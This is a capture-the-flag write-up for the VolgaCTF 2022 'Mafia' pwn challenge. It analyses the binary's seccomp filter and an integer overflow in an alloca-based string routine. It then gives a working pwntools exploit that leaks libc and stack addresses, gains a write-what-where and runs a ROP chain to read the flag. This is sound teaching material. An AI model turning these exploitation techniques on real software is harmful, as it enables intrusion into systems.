# VolgaCTF 2022 Qualifier

## Mafia

> My friends and I decided to play some sports mafia this night! But is there any way to cheat in this game? Flag is in `/task/flag.txt`.
>
> `nc mafia.q.2022.volgactf.ru 1337`
> 
> [`mafia`](mafia)  
> [`ld.so`](ld.so)  
> [`libc.so.6`](libc.so.6)  

Tags: _pwn_ _x86-64_ _seccomp_ _rop_ _write-what-where_ _integer-overflow_


## Summary

A filthy stack and integer overflow leads to a _write-what-where_ used to deploy a seccomp filtered ROP chain.


## Analysis

### Checksec

```
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

All mitigations in place.


### Decompile with Ghidra

From `setup`:

```c
  uVar1 = seccomp_init(0);
  uVar2 = 0x101347;
  seccomp_rule_add(uVar1,0x7fff0000,0xe7,0);
  seccomp_rule_add(uVar1,0x7fff0000,0,1,in_R8,in_R9,0x400000000,0,0,uVar2);
  seccomp_rule_add(uVar1,0x7fff0000,1,1,in_R8,in_R9,0x400000000,1,0);
  seccomp_rule_add(uVar1,0x7fff0000,9,0);
  seccomp_rule_add(uVar1,0x7fff0000,2,0);
  seccomp_rule_add(uVar1,0x7fff0000,3,0);
  seccomp_rule_add(uVar1,0x7fff0000,0xc,0);
  seccomp_load(uVar1);
  seccomp_release(uVar1);
```

we have the following seccomp rules:

```bash
# seccomp-tools dump ./mafia
 line  CODE  JT   JF      K
=================================
 0000: 0x20 0x00 0x00 0x00000004  A = arch
 0001: 0x15 0x00 0x13 0xc000003e  if (A != ARCH_X86_64) goto 0021
 0002: 0x20 0x00 0x00 0x00000000  A = sys_number
 0003: 0x35 0x00 0x01 0x40000000  if (A < 0x40000000) goto 0005
 0004: 0x15 0x00 0x10 0xffffffff  if (A != 0xffffffff) goto 0021
 0005: 0x15 0x0e 0x00 0x00000002  if (A == open) goto 0020
 0006: 0x15 0x0d 0x00 0x00000003  if (A == close) goto 0020
 0007: 0x15 0x0c 0x00 0x00000009  if (A == mmap) goto 0020
 0008: 0x15 0x0b 0x00 0x0000000c  if (A == brk) goto 0020
 0009: 0x15 0x0a 0x00 0x000000e7  if (A == exit_group) goto 0020
 0010: 0x15 0x00 0x04 0x00000000  if (A != read) goto 0015
 0011: 0x20 0x00 0x00 0x00000014  A = fd >> 32 # read(fd, buf, count)
 0012: 0x15 0x00 0x08 0x00000000  if (A != 0x0) goto 0021
 0013: 0x20 0x00 0x00 0x00000010  A = fd # read(fd, buf, count)
 0014: 0x15 0x05 0x06 0x00000000  if (A == 0x0) goto 0020 else goto 0021
 0015: 0x15 0x00 0x05 0x00000001  if (A != write) goto 0021
 0016: 0x20 0x00 0x00 0x00000014  A = fd >> 32 # write(fd, buf, count)
 0017: 0x15 0x00 0x03 0x00000000  if (A != 0x0) goto 0021
 0018: 0x20 0x00 0x00 0x00000010  A = fd # write(fd, buf, count)
 0019: 0x15 0x00 0x01 0x00000001  if (A != 0x1) goto 0021
 0020: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0021: 0x06 0x00 0x00 0x00000000  return KILL
```

We are limited to `read`, `write`, `open`, `close`, `mmap`, `brk`, and `exit_group` syscalls.

`open`/`read`/`write` is all we should need to get the flag, however starting at line `0012` the `read` syscall file descriptor (`fd`) is limited to `0` and only `0`.  `0` is usually reserved for `stdin` (FYI, FDs `0`, `1`, and `2` are all tied to `/dev/tty` and can all be used for tty input and output).  If we were to `open` `flag.txt`, we'd most likely end up with an `fd` of `3` since `0`, `1`, and `2` are in use.  This is where `close` comes in handy, we'll have to close `0` first so that on `open` the next `fd` is `0`.

> _Pssst..., if a CTF challenge blocks you with `close(1); close(2);`, you can get output with `write(0,...)`._

```c
    if (uVar2 == 1) {
      *(undefined8 *)(puVar5 + -8) = 0x10156c;
      puts("Input desired size:");
      *(undefined8 *)(puVar5 + -8) = 0x101587;
      __isoc99_scanf(&%u,&local_e4);
      local_dc = 4 - (local_e4 & 3);
      if (local_e4 < 0x401) {
        *(undefined8 *)(puVar5 + -8) = 0x1015bc;
        puts("Input desired index:");
        *(undefined8 *)(puVar5 + -8) = 0x1015d7;
        __isoc99_scanf(&%u,&local_e0);
        if ((local_e0 < 0x10) && (local_98[local_e0] == (char *)0x0)) {
          *(undefined8 *)(puVar5 + -8) = 0x10160b;
          puts("Your string:");
          lVar4 = (((ulong)local_e4 + 0x17) / 0x10) * -0x10;
          local_98[local_e0] = (char *)((ulong)(puVar5 + lVar4 + 0xf) & 0xfffffffffffffff0);
          *(uint *)((long)local_d8 + (ulong)local_e0 * 4) = local_e4 - local_dc;
          uVar2 = local_e4 - local_dc;
          pcVar1 = local_98[local_e0];
          *(undefined8 *)(puVar5 + lVar4 + -8) = 0x10169f;
          read(0,pcVar1,(ulong)uVar2);
          puVar5 = puVar5 + lVar4;
        }
      }
    }
```

The vuln is in the `if (uVar2 == 1) {` (`1. Add string`) block.  If you follow the code from top down, `local_e4` is the size of the string to be allocated (on the stack--more on this later).  If `local_e4` (`uint`) is `0`, then `local_dc` will be `4`.

The statement `*(uint *)((long)local_d8 + (ulong)local_e0 * 4) = local_e4 - local_dc;` is really just `local_d8[local_e0] = local_e4 - local_dc;`.  `local_d8` is an array of 32-bit ints (`uint`) that stores the length of the string indexed by `local_e0` (follow the code).  If `local_e4` is `0` and `local_dc` is 4, then we have an integer overflow and `local_e4` will be `-4`, but since `uint`, it's `+0xfffffffc`.  This will allow writes out of bounds on edit, however we do not need to wait, this same error is repeated with `uVar2 = local_e4 - local_dc;` and used as the length for the `read(0,pcVar1,(ulong)uVar2)` call, effectively allowing us to write down stack, and since the pointers to the strings are down stack, we can overwrite them with any address rendering a _write-what-where_.

But first we need some leaks.

This strange looking code:

```c
lVar4 = (((ulong)local_e4 + 0x17) / 0x10) * -0x10;
```

is effectively `alloca`:

```assembly
        0010160b 8b 85 24        MOV        EAX,dword ptr [RBP + local_e4]
                 ff ff ff
        00101611 89 c0           MOV        EAX,EAX
        00101613 8b 8d 28        MOV        ECX,dword ptr [RBP + local_e0]
                 ff ff ff
        00101619 48 8d 50 08     LEA        RDX,[RAX + 0x8]
        0010161d b8 10 00        MOV        EAX,0x10
                 00 00
        00101622 48 83 e8 01     SUB        RAX,0x1
        00101626 48 01 d0        ADD        RAX,RDX
        00101629 be 10 00        MOV        ESI,0x10
                 00 00
        0010162e ba 00 00        MOV        EDX,0x0
                 00 00
        00101633 48 f7 f6        DIV        RSI
        00101636 48 6b c0 10     IMUL       RAX,RAX,0x10
        0010163a 48 29 c4        SUB        RSP,RAX
```

Do not concern yourself with the details, just notice the last statement, the stack has been grown by the inline C function `alloca`, and `RSP` is currently pointing to the new allocation; that same pointer is stored down stack in an array that can be overwritten.

This `alloca`'d space has not been initialized, left over on the stack are leaked stack, libc, and base process locations that can be easily exfiltrated with the `2. Edit string` and `3. Print string` functions.

The plan is simple:

1. Leak the location of libc.
2. Leak the location of the stack, then compute the location of the return address on the stack.
3. Use the zero-length string vuln (see above) to overwrite a pointer to a string and have it point to the return address on the stack.
4. Write out a ROP chain.
5. Profit.


### Getting offsets with GDB/GEF

If you want to read the code and compute all of this mathematically, then go for it, but for these `alloca` challenges I find it easier to just use GDB/GEF and look at the stack myself:

```
gef➤  telescope 40
0x00007fffffffe280│+0x0000: 0x0000000000000000	 ← $rsp
0x00007fffffffe288│+0x0008: 0x000055555555560b  →  <main+385> mov eax, DWORD PTR [rbp-0xdc]
0x00007fffffffe290│+0x0010: 0x0000550a68616c62 ("blah\nU"?)	 ← $rax, $rdi
0x00007fffffffe298│+0x0018: 0x00007ffff7e4476a  →  <puts+378> cmp eax, 0xffffffff
0x00007fffffffe2a0│+0x0020: 0x0000000000000000
0x00007fffffffe2a8│+0x0028: 0x00007fffffffe3b0  →  0x00005555555557b0  →  <__libc_csu_init+0> push r15
0x00007fffffffe2b0│+0x0030: 0x0000555555555100  →  <_start+0> xor ebp, ebp
0x00007fffffffe2b8│+0x0038: 0x0000000000000000
0x00007fffffffe2c0│+0x0040: 0x0000000000000000
0x00007fffffffe2c8│+0x0048: 0x000055555555560b  →  <main+385> mov eax, DWORD PTR [rbp-0xdc]
0x00007fffffffe2d0│+0x0050: 0x0000000000000000
0x00007fffffffe2d8│+0x0058: 0x0000000400000000
0x00007fffffffe2e0│+0x0060: 0xfffffffc0000002c (","?)
0x00007fffffffe2e8│+0x0068: 0x0000000000000000
0x00007fffffffe2f0│+0x0070: 0x0000000000000000
0x00007fffffffe2f8│+0x0078: 0x0000000000000000
0x00007fffffffe300│+0x0080: 0x0000000000000000
0x00007fffffffe308│+0x0088: 0x0000000000000000
0x00007fffffffe310│+0x0090: 0x0000000000000000
0x00007fffffffe318│+0x0098: 0x0000000000000000
0x00007fffffffe320│+0x00a0: 0x00007fffffffe290  →  0x0000550a68616c62 ("blah\nU"?)
0x00007fffffffe328│+0x00a8: 0x00007fffffffe280  →  0x0000000000000000
0x00007fffffffe330│+0x00b0: 0x0000000000000000
0x00007fffffffe338│+0x00b8: 0x0000000000000000
0x00007fffffffe340│+0x00c0: 0x0000000000000000
0x00007fffffffe348│+0x00c8: 0x0000000000000000
0x00007fffffffe350│+0x00d0: 0x0000000000000000
0x00007fffffffe358│+0x00d8: 0x0000000000000000
0x00007fffffffe360│+0x00e0: 0x0000000000000000
0x00007fffffffe368│+0x00e8: 0x0000000000000000
0x00007fffffffe370│+0x00f0: 0x0000000000000000
0x00007fffffffe378│+0x00f8: 0x0000000000000000
0x00007fffffffe380│+0x0100: 0x0000000000000000
0x00007fffffffe388│+0x0108: 0x0000000000000000
0x00007fffffffe390│+0x0110: 0x0000000000000000
0x00007fffffffe398│+0x0118: 0x0000000000000000
0x00007fffffffe3a0│+0x0120: 0x00007fffffffe4a0  →  0x0000000000000001
0x00007fffffffe3a8│+0x0128: 0x7c84ce9d856c3600
0x00007fffffffe3b0│+0x0130: 0x00005555555557b0  →  <__libc_csu_init+0> push r15	 ← $rbp
0x00007fffffffe3b8│+0x0138: 0x00007ffff7df4d0a  →  <__libc_start_main+234> mov edi, eax
```

Above is what the stack looks like after setting a break point at `*main+740` (the `puts` in `3. Print string`), and then creating a string at index `0` of length `48` with contents `blah\n`, followed by a string at index `1` with a length of `0`.

> Why `48`?  I tested various sizes, the larger the allocation the more leaks in the stack, `48` gave me access to a stack and libc leak in close proximity to `$rsp`.

At line `+0x0060` you can observe the `uint` array of string lengths, including the `0xfffffffc` from the string length of `0`.  And starting at line `+0x00a0` is the array of pointers for to the `alloca` created strings on stack.

This dirty stack has everything we need to leverage our _write-what-where_; at `+0x0018` is a libc leak, and at `+0x0028` a stack leak.  If you look at the value of that leak, it is the same as `$rbp` (look at bottom of stack dump), add `8` to that and you have the stack address of the return address we are going to overwrite with our ROP chain.

**NOTE: different libc's will use the stack in different ways, so it is very important to use the challenge provided libc, e.g.:**

```bash
cp mafia mafiap
patchelf --set-interpreter $PWD/ld.so --set-rpath $PWD mafiap
```

The above will make it easier to work with GDB/pwntools.

> It's not the only way, just the lazy way.


## Exploit

```python
#!/usr/bin/env python3

from pwn import *

binary = context.binary = ELF('./mafiap',checksec=False)
libc = ELF('./libc.so.6',checksec=False)

if args.REMOTE:
    p = remote('mafia.q.2022.volgactf.ru', 1337)
else:
    p = process(binary.path)
```

Standard pwntools header.

```python
p.sendlineafter(b'>> ',b'1')
p.sendlineafter(b'size:\n',b'48')
p.sendlineafter(b'index:\n',b'0')
p.sendlineafter(b'string:\n',7 * b'A')
p.sendlineafter(b'>> ',b'3')
p.sendlineafter(b'index:\n',b'0')
p.recvline()
libc.address = u64(p.recv(6) + b'\0\0') - libc.sym.puts - 378
log.info('libc.address: {x}'.format(x = hex(libc.address)))
```

The above will leak libc based on the stack diagram above (Analysis section).

> Index `0` string starts at `+0x0010` (see stack diagram above) with the leak at `+0x0018`, the difference is `8`, so send `8` bytes (e.g. above `7` + `\n` (`sendlineafter`)), then just `3. Print string`.

```python
p.sendlineafter(b'>> ',b'2')
p.sendlineafter(b'index:\n',b'0')
p.sendlineafter(b'string:\n',23 * b'A')
p.sendlineafter(b'>> ',b'3')
p.sendlineafter(b'index:\n',b'0')
p.recvline()
stack_leak = u64(p.recv(6) + b'\0\0')
log.info('stack_leak: {x}'.format(x = hex(stack_leak)))
return_address = stack_leak + 8
log.info('return_address: {x}'.format(x = hex(return_address)))
```

Same logic as the previous leak, but this time for the stack to then compute the location of the return address on the stack.  See Analysis section above.

```python
p.sendlineafter(b'>> ',b'1')
p.sendlineafter(b'size:\n',b'0')
p.sendlineafter(b'index:\n',b'1')
p.sendlineafter(b'string:\n',0xa0 * b'A' + p64(return_address))
```

Use the index `1` string (the one with zero length), to overwrite the pointer to string `0` (`+0x00a0`) to point to the return address on the stack.

```python
pop_rax = libc.search(asm('pop rax; ret')).__next__()
pop_rdi = libc.search(asm('pop rdi; ret')).__next__()
pop_rsi = libc.search(asm('pop rsi; ret')).__next__()
pop_rax_rdx_rbx = libc.search(asm('pop rax; pop rdx; pop rbx; ret')).__next__()
syscall = libc.search(asm('syscall; ret')).__next__()

flag_offset = 0x100
payload = b''

# close
payload += p64(pop_rdi)
payload += p64(0)
payload += p64(pop_rax)
payload += p64(constants.SYS_close)
payload += p64(syscall)

# open
payload += p64(pop_rdi)
payload += p64(return_address + flag_offset)
payload += p64(pop_rsi)
payload += p64(0)
payload += p64(pop_rax_rdx_rbx)
payload += p64(constants.SYS_open)
payload += p64(0)
payload += p64(0)
payload += p64(syscall)

# read
payload += p64(pop_rdi)
payload += p64(0)
payload += p64(pop_rsi)
payload += p64(return_address + flag_offset)
payload += p64(pop_rax_rdx_rbx)
payload += p64(constants.SYS_read)
payload += p64(100)
payload += p64(0)
payload += p64(syscall)

# write
payload += p64(pop_rdi)
payload += p64(1)
payload += p64(pop_rax)
payload += p64(constants.SYS_write)
payload += p64(syscall)

# static flag.txt
payload += (flag_offset - len(payload)) * b'A' + b'flag.txt\0'
```

Create basic ROP chain:

1. `close` FD `0` so that it can be reused by `open` (see Analysis section above on seccomp rules).
2. `open` `flag.txt` (stored down stack) as FD `0`.
3. `read` FD `0`, and overwrite `flag.txt` on stack with `flag.txt` contents.  (The file is already open and tied to FD `0`; we no longer need this file name.  BTW, this works with file systems as well, if the file is open, you can still read from it even if removed, just get the FD from `/proc`).
4. `write` to `stdout` the flag.
5. Append to the end the text `flag.txt\0` for use by `open`.

```python
p.sendlineafter(b'>> ',b'2')
p.sendlineafter(b'index:\n',b'0')
p.sendlineafter(b'string:\n',payload)
p.sendlineafter(b'>> ',b'4')

flag = p.recvuntil(b'}').decode()
p.close()
print(flag)
```

Just write out the ROP chain as the index 0 string, and exit to exploit.

> You may need to run a few times to get the flag.  See `exploit1a.py` below.

Output:

```bash
# ./exploit.py REMOTE=1
[+] Opening connection to mafia.q.2022.volgactf.ru on port 1337: Done
[*] libc.address: 0x7f149db2c000
[*] stack_leak: 0x7ffc1cbf56a0
[*] return_address: 0x7ffc1cbf56a8
[*] Closed connection to mafia.q.2022.volgactf.ru port 1337
VolgaCTF{d0n7_y0u_try_70_ch347}
```

## exploit1a

`exploit1a.py` adds some checks and will exit early if the stack leaks are garbage or if the stack is too high up in user space.

e.g.:

```
[+] Starting local process '/pwd/datajerk/volgactf2022quals/mafia/mafiap': pid 43731
[*] libc.address: 0x7f836ae82000
[*] stack_leak: 0x6441202e310a
[*] return_address: 0x6441202e3112
[*] Stopped process '/pwd/datajerk/volgactf2022quals/mafia/mafiap' (pid 43731)
[CRITICAL] this is not the stack leak you're looking for, try again
```

```
[+] Starting local process '/pwd/datajerk/volgactf2022quals/mafia/mafiap': pid 37709
[*] libc.address: 0x7fef7b972000
[*] stack_leak: 0x7fff631cdae0
[*] return_address: 0x7fff631cdae8
[*] Stopped process '/pwd/datajerk/volgactf2022quals/mafia/mafiap' (pid 37709)
[CRITICAL] read beyond user-space: 0x8000631cdae4
[CRITICAL] read syscall will fail, try again
```

There's a ~1/3 chance of encountering one of these errors.

> If you were using GDB or had disable ASLR you would have failed 100% of the time because the stack is at the top of user space.

## exploit2

`exploit2.py` explores the other route, `mmap`.  See the comments in the code.